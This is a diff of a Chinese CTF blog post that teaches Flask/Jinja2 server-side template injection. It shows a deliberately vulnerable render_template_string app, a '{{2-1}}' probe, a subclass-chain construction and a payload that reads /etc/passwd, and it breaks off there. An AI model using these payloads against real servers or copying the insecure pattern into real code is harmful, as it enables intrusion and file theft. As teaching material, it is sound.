@@ -1,263 +1,177 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>flask | 一路走到黑</title><meta name="author" content="sunzy"><meta name="copyright" content="sunzy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="flask框架类型的题目，在最近几次的比赛中经常出现，但是每次出现都会让人苦不堪言，因为实在是不了解该类型的题目，所以有必要花时间总结一下该类型题目的套路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="flask">
+<meta property="og:url" content="https://sunzhengyu99.github.io/2021/02/08/flask/index.html">
+<meta property="og:site_name" content="一路走到黑">
+<meta property="og:description" content="flask框架类型的题目，在最近几次的比赛中经常出现，但是每次出现都会让人苦不堪言，因为实在是不了解该类型的题目，所以有必要花时间总结一下该类型题目的套路">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-02-08T07:13:40.000Z">
+<meta property="article:modified_time" content="2021-02-09T13:26:34.786Z">
+<meta property="article:author" content="sunzy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sunzhengyu99.github.io/2021/02/08/flask/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
 
+const saveToLocal = {
+  // ttl 單位是 天
+  set: function setWithExpiry(key, value, ttl) {
+    if (ttl === 0) return
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
 
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
 
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
 
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
 
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
-  <link rel="icon" type="image/png" href="/img/feiji.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="sunzy">
-  <meta name="keywords" content="">
-  <title>flask - 一路走到黑</title>
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-02-09 21:26:34'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
-  
-    
-    
-      
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
-    
-  
-
-  
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 4.2.0"></head>
-
-
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="banner intro-2" id="background" parallax=true
-         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="container page-header text-center fade-in-up">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-02-08 15:13" pubdate>
-        2021年2月8日 下午
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      2.9k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      42
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- 不蒜子统计文章PV -->
-      <span id="busuanzi_container_page_pv" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
-      </span>
-    
-  
-</div>
-
-            
-          </div>
-
-          
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto" id="post">
-            <!-- SEO header -->
-            <h1 style="display: none">flask</h1>
-            
-              <p class="note note-info">
-                
-                  本文最后更新于：几秒前
-                
-              </p>
-            
-            <div class="markdown-body" id="post-body">
-              <p>flask框架类型的题目，在最近几次的比赛中经常出现，但是每次出现都会让人苦不堪言，因为实在是不了解该类型的题目，所以有必要花时间总结一下该类型题目的套路</p>
-<a id="more"></a>
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">一路走到黑</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">flask</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-08T07:13:40.000Z" title="发表于 2021-02-08 15:13:40">2021-02-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-09T13:26:34.786Z" title="更新于 2021-02-09 21:26:34">2021-02-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>flask框架类型的题目，在最近几次的比赛中经常出现，但是每次出现都会让人苦不堪言，因为实在是不了解该类型的题目，所以有必要花时间总结一下该类型题目的套路</p>
+<span id="more"></span>
 
 <h1 id="0x1-基础知识"><a href="#0x1-基础知识" class="headerlink" title="0x1 基础知识"></a>0x1 基础知识</h1><p>从Flask的模板引擎Jinja2入手，CTF中大多数也都是使用这种模板引擎</p>
 <h2 id="模板的基本语法"><a href="#模板的基本语法" class="headerlink" title="模板的基本语法"></a>模板的基本语法</h2><p>官方文档对于模板的语法介绍如下</p>
-<div class="hljs"><pre><code class="hljs routeros">&#123;% <span class="hljs-built_in">..</span>. %&#125; <span class="hljs-keyword">for</span> Statements
-
-&#123;&#123; <span class="hljs-built_in">..</span>. &#125;&#125; <span class="hljs-keyword">for</span> Expressions <span class="hljs-keyword">to</span> <span class="hljs-builtin-name">print</span> <span class="hljs-keyword">to</span> the template output
-
-&#123;# <span class="hljs-built_in">..</span>. #&#125; <span class="hljs-keyword">for</span> Comments <span class="hljs-keyword">not</span> included <span class="hljs-keyword">in</span> the template output
-
-<span class="hljs-comment">#  ... ## for Line Statements</span></code></pre></div>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; <span class="keyword">for</span> Statements</span><br><span class="line"></span><br><span class="line">&#123;&#123; ... &#125;&#125; <span class="keyword">for</span> Expressions <span class="keyword">to</span> <span class="built_in">print</span> <span class="keyword">to</span> the template output</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment"># ... #&#125; for Comments not included in the template output</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  ... ## for Line Statements</span></span><br></pre></td></tr></table></figure>
 
 
 
@@ -265,13 +179,7 @@
 <li><code>__class__</code></li>
 </ul>
 <p>用于返回对象所属的类</p>
-<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
-<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">str</span>'&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; <span class="hljs-params">()</span>.<span class="hljs-title">__class__</span></span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">tuple</span>'&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; [].<span class="hljs-title">__class__</span></span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">list</span>'&gt;</span></code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><code>__base__</code></li>
@@ -294,196 +202,108 @@
 </ul>
 <p>会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合<code>init</code>使用</p>
 <h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>存在模板注入漏洞原因有二，一是存在用户输入变量可控，二是了使用不固定的模板，这里简单给出一个存在SSTI的代码如下</p>
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template_string
-app = Flask(__name__)
-
-<span class="hljs-meta">@app.route('/', methods=['GET', 'POST'])</span>
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
-    name = request.args.get(<span class="hljs-string">'name'</span>)
-    template = <span class="hljs-string">'''</span>
-<span class="hljs-string">&lt;html&gt;</span>
-<span class="hljs-string">  &lt;head&gt;</span>
-<span class="hljs-string">    &lt;title&gt;SSTI&lt;/title&gt;</span>
-<span class="hljs-string">  &lt;/head&gt;</span>
-<span class="hljs-string"> &lt;body&gt;</span>
-<span class="hljs-string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span>
-<span class="hljs-string">  &lt;/body&gt;</span>
-<span class="hljs-string">&lt;/html&gt;</span>
-<span class="hljs-string">        '''</span>% (name)
-    <span class="hljs-keyword">return</span> render_template_string(template)
-<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
-    app.run(host=<span class="hljs-string">"0.0.0.0"</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;SSTI&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>% (name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
-<p>提交参数<code>name=1</code>，会显示1，这也是测试ssti的一种常用的方法</p>
+<p>提交参数<code>name=&#123;&#123;2-1&#125;&#125;</code>，会显示1，这也是测试ssti的一种常用的方法</p>
 <p>下图是常用的测试方法和对应的模板类型</p>
-<p><img src="https://i.loli.net/2020/11/30/LAJfgePG7qsKph4.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/LAJfgePG7qsKph4.png" alt></p>
 <h1 id="0x2-构造链思路"><a href="#0x2-构造链思路" class="headerlink" title="0x2 构造链思路"></a>0x2 构造链思路</h1><p>这里从零开始介绍如何去构造SSTI漏洞的payload，可以用上面存在SSTI漏洞的<code>ssti.py</code>做实验</p>
 <ul>
 <li>第一步</li>
 </ul>
 <p>目的：使用<code>__class__</code>来获取内置类所对应的类</p>
 <p>可以通过使用<code>str</code>，<code>list</code>，<code>tuple</code>，<code>dict</code>等来获取</p>
-<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
-<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">str</span>'&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; "".<span class="hljs-title">__class__</span></span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">str</span>'&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; [].<span class="hljs-title">__class__</span></span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">list</span>'&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; <span class="hljs-params">()</span>.<span class="hljs-title">__class__</span></span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">tuple</span>'&gt;</span>
-&gt;&gt;&gt; &#123;&#125;.__class__
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">dict</span>'&gt;</span></code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">dict</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>第二步</li>
 </ul>
 <p>目的：拿到<code>object</code>基类</p>
 <p>用<code>__bases__[0]</code>拿到基类</p>
-<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
-<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__.__bases__[<span class="hljs-number">0</span>]
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">object</span>'&gt;</span></code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>用<code>__base__</code>拿到基类</p>
-<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
-<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__.__base__
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">object</span>'&gt;</span></code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>用<code>__mro__[1]</code>或者<code>__mro__[-1]</code>拿到基类</p>
-<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
-<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__.__mro__[<span class="hljs-number">1</span>]
-&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">object</span>'&gt;</span>
-<span class="hljs-class">&gt;&gt;&gt; ''.<span class="hljs-title">__class__</span>.<span class="hljs-title">__mro__</span>[-1]</span>
-<span class="hljs-class">&lt;<span class="hljs-title">class</span> '<span class="hljs-title">object</span>'&gt;</span></code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__mro__</span>[-1]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>第三步</li>
 </ul>
 <p>用<code>__subclasses__()</code>拿到子类列表</p>
-<div class="hljs"><pre><code class="hljs python">Python <span class="hljs-number">3.7</span><span class="hljs-number">.8</span>
-<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">''</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()
-...一大堆的子类</code></pre></div>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">...一大堆的子类</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>第四步</li>
 </ul>
 <p>在子类列表中找到可以getshell的类</p>
 <p>然后直接调用里面的方法即可，payload如下</p>
-<h2 id="读文件payload"><a href="#读文件payload" class="headerlink" title="读文件payload"></a>读文件payload</h2><div class="hljs"><pre><code class="hljs python">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">'/etc/passwd'</span>).read()&#125;&#125;
-
